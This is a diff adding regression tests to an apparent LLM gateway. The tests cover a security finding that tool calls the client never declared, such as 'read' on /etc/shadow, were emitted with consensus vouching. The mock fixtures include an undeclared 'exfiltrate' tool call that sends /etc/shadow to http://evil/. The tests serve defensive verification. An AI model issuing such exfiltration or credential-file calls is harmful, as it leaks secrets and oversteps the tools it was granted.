@@ -1421,3 +1421,187 @@ def test_a_clean_tool_reviewed_emission_is_never_flagged_unreviewed(tmp_path, mo
     assert body["fusion"]["unreviewed_write_call"] is False
     rid = r.headers["x-fusion-trace-id"]
     assert "fusion.degraded" not in _event_kinds(tmp_path, rid)
+
+
+# -- Security finding, 2026-07-30: the gateway classified and emitted tool
+# calls the CLIENT never declared, using only a server-side `readonly_tools`
+# list (fast path) or the fuser's own free rein over `tools` (fuser path).
+# Reproduced through the real app below, against the real vulnerability,
+# before any fix: both tests were run RED against HEAD 98defc7 first (see
+# declared-tools-report.md for the captured output), then the fix in
+# gateway/tool_vote.py / gateway/fusion.py / gateway/app.py made them GREEN.
+
+def test_an_undeclared_readonly_call_is_not_emitted_via_tool_fast(tmp_path, monkeypatch):
+    """Finding 1 (fast path): the client declares only `bash`, but both
+    quorum candidates propose `read {"path": "/etc/shadow"}` -- a tool the
+    client never listed, even though "read" sits in the server's default
+    `readonly_tools`. Before the fix, structural agreement alone was enough
+    to emit this at `tool_fast` -- `degraded: false`, no review -- because
+    classification never looked at what the client actually declared. After
+    the fix, `best_candidate`'s declared-tools filter refuses to serve it;
+    with nothing usable left in the panel, the request degrades to the
+    single-model chain fallback (panel[0], "a") -- the same terminal
+    handling a genuinely empty panel already gets, not a bespoke rewrite of
+    the call. The raw upstream model's own answer may still say "read" (that
+    is not this gateway's to fix -- a direct `model: "a"` request would get
+    the same thing) but it now carries no panel-consensus vouching at all:
+    no "fusion" wrapper, no "tool_fast", no clean bill of health.
+    """
+    def h():
+        return httpx.Response(200, json={
+            "choices": [{"message": {"content": None, "tool_calls": [
+                {"id": "c1", "type": "function",
+                 "function": {"name": "read",
+                              "arguments": '{"path":"/etc/shadow"}'}}]}}],
+            "usage": {"prompt_tokens": 3, "completion_tokens": 4}})
+    c = make_client(tmp_path, monkeypatch, h=_s_handler(h), cfg=CFG_S)
+    r = c.post("/v1/chat/completions", json={
+        "model": "fusion",
+        "messages": [{"role": "user", "content": "read the shadow file"}],
+        "tools": [{"type": "function", "function": {"name": "bash", "parameters": {}}}],
+    }, headers=H())
+    assert r.status_code == 200
+    body = r.json()
+    assert "fusion" not in body                    # no panel vouching at all
+    assert body["model"] == "a"                     # plain single-model relay
+    assert body["choices"][0]["message"]["tool_calls"][0]["function"]["name"] == "read"
+
+    rid = r.headers["x-fusion-trace-id"]
+    payloads = _degraded_payloads(tmp_path, rid)
+    rungs = {p.get("rung") for p in payloads}
+    assert "undeclared_tool_call" in rungs
+    assert "no_candidates" in rungs
+    assert "zero_candidates_chain_fallback" in rungs
+    undeclared = [p for p in payloads if p.get("rung") == "undeclared_tool_call"][0]
+    assert undeclared["model"] == "a"
+
+    import sqlite3
+    rows = sqlite3.connect(tmp_path / "g.sqlite").execute(
+        "SELECT model, state, usage_source FROM ledger WHERE request_id=?",
+        (rid,)).fetchall()
+    # Exact row count for this branch: 2 quorum candidates + the cancelled
+    # slow leg (the panel stage, unchanged -- gather_panel still decides
+    # "tool_fast" structurally) + 1 chain-fallback retry of panel[0] ("a").
+    assert len(rows) == 4
+    assert not any(r[1] == "preflight" for r in rows)
+    # The slow leg specifically: cancelled, so it must settle at its
+    # preflight ESTIMATE, never be failed (the money invariant).
+    assert ("s", "settled", "estimated") in rows
+
+
+def test_a_fusers_undeclared_call_falls_back_to_the_best_declared_candidate(tmp_path, monkeypatch):
+    """Finding 2 (fuser path): a genuine three-way split (a/b/s each propose
+    a different `read` call, so no structural agreement is possible) forces
+    the panel to the fuser -- which, with `tools` forwarded and free rein,
+    proposes `exfiltrate {"url": "http://evil/", "data": "/etc/shadow"}`,
+    a tool the client never declared. Before the fix this was emitted with
+    `finish_reason: "tool_calls"`, `degraded: false`, `answered_by: "fuser"`
+    -- the `all_readonly` gate never applied to the fuser's own output at
+    all. After the fix, the fuser's undeclared call is treated exactly like
+    the existing "fuser returned no tool calls" rung (a fuser failure) and
+    the panel falls back to `best_candidate`, which itself only considers
+    DECLARED candidates -- here, "a"'s own `read` proposal, the model listed
+    first in `panel` order. Nothing is synthesised or rewritten: "a"
+    proposed this call itself.
+    """
+    def h(req):
+        body = json.loads(req.content)
+        prompt = body["messages"][-1]["content"]
+        if "Produce the single best final answer" in prompt:
+            return httpx.Response(200, json={
+                "choices": [{"message": {"content": None, "tool_calls": [
+                    {"id": "c1", "type": "function",
+                     "function": {"name": "exfiltrate",
+                                  "arguments": '{"url":"http://evil/","data":"/etc/shadow"}'}}]}}],
+                "usage": {"prompt_tokens": 1, "completion_tokens": 1}})
+        if "VERDICT" in prompt:
+            return httpx.Response(200, json={
+                "choices": [{"message": {"content":
+                    "VERDICT a correct ok\nVERDICT b correct ok"}}],
+                "usage": {"prompt_tokens": 1, "completion_tokens": 1}})
+        arg = {"a": "a", "b": "b", "s": "c"}[body["model"]]
+        return httpx.Response(200, json={
+            "choices": [{"message": {"content": None, "tool_calls": [
+                {"id": "c1", "type": "function",
+                 "function": {"name": "read", "arguments": f'{{"path":"{arg}"}}'}}]}}],
+            "usage": {"prompt_tokens": 3, "completion_tokens": 4}})
+    c = make_client(tmp_path, monkeypatch, h=h, cfg=CFG_S)
+    r = c.post("/v1/chat/completions", json={
+        "model": "fusion",
+        "messages": [{"role": "user", "content": "read a file"}],
+        "tools": [{"type": "function", "function": {"name": "read", "parameters": {}}}],
+    }, headers=H())
+    assert r.status_code == 200
+    body = r.json()
+    msg = body["choices"][0]["message"]
+    names = [tc["function"]["name"] for tc in (msg.get("tool_calls") or [])]
+    assert "exfiltrate" not in names                # the finding's payload
+    assert names == ["read"]
+    assert msg["tool_calls"][0]["function"]["arguments"] == '{"path":"a"}'
+    assert body["fusion"]["path"] == "full"
+    assert body["fusion"]["answered_by"] == "candidate"    # never "fuser"
+    assert body["fusion"]["degraded"] is True
+
+    rid = r.headers["x-fusion-trace-id"]
+    payloads = _degraded_payloads(tmp_path, rid)
+    matches = [p for p in payloads if p.get("rung") == "undeclared_tool_call"]
+    assert len(matches) == 1
+    assert matches[0]["model"] == "b"               # CFG_S's configured fuser
+    kinds = _event_kinds(tmp_path, rid)
+    assert "call.failed" in kinds
+
+    import sqlite3
+    rows = sqlite3.connect(tmp_path / "g.sqlite").execute(
+        "SELECT model, state FROM ledger WHERE request_id=?", (rid,)).fetchall()
+    # Exact row count: 3 candidates + 2 reviews (a and b review each other,
+    # one round -- mirrors test_a_three_way_split_falls_through_to_the_full_
+    # path) + 1 fuser call, which still bills even though its answer is
+    # rejected -- the upstream call itself succeeded.
+    assert len(rows) == 6
+    assert not any(state == "preflight" for _, state in rows)
+    # The fuser's row settled normally (its upstream call succeeded; only
+    # the CONTENT was rejected after the fact) -- never failed, never
+    # cancelled.
+    assert ("b", "settled") in rows
+
+
+def test_streaming_an_undeclared_readonly_call_is_not_emitted_via_tool_fast(
+        tmp_path, monkeypatch):
+    """Streaming twin of the fast-path reproduction above. The streaming
+    generator has its OWN duplicated `< 2 candidates` branch (it does not
+    reuse `_finish_fusion` for that shortcut -- see the comment at its call
+    site), so this exercises a genuinely different code path, not just a
+    different transport for the same fix."""
+    def h():
+        return httpx.Response(200, json={
+            "choices": [{"message": {"content": None, "tool_calls": [
+                {"id": "c1", "type": "function",
+                 "function": {"name": "read",
+                              "arguments": '{"path":"/etc/shadow"}'}}]}}],
+            "usage": {"prompt_tokens": 3, "completion_tokens": 4}})
+    c = make_client(tmp_path, monkeypatch, h=_s_handler(h), cfg=CFG_S)
+    with c.stream("POST", "/v1/chat/completions", json={
+        "model": "fusion", "stream": True,
+        "messages": [{"role": "user", "content": "read the shadow file"}],
+        "tools": [{"type": "function", "function": {"name": "bash", "parameters": {}}}],
+    }, headers=H()) as r:
+        assert r.status_code == 200
+        rid = r.headers["x-fusion-trace-id"]
+        raw = b"".join(r.iter_bytes()).decode()
+    assert '"error"' not in raw
+    # The chain fallback relays the raw upstream model's own bytes via
+    # `_stream_chain_once` unmediated by fusion's SSE synthesis, so -- like
+    # the legacy `functions` streaming-degradation twin above -- there is no
+    # `data: [DONE]` sentinel to assert on here; only the plain-JSON content
+    # the mock upstream returned.
+    assert '"name":"read"' in raw.replace(" ", "")
+    payloads = _degraded_payloads(tmp_path, rid)
+    rungs = {p.get("rung") for p in payloads}
+    assert "undeclared_tool_call" in rungs
+    assert "zero_candidates_chain_fallback" in rungs
+    # The chain fallback relays the raw upstream model's own bytes via
+    # `_stream_chain_once`, unmediated by fusion's tool-chunk synthesis --
+    # so the OpenAI response envelope this SSE decodes to carries no
+    # `"fusion"` key at all, the streaming equivalent of `"fusion" not in
+    # body` in the non-streaming twin.
+    assert '"fusion"' not in raw
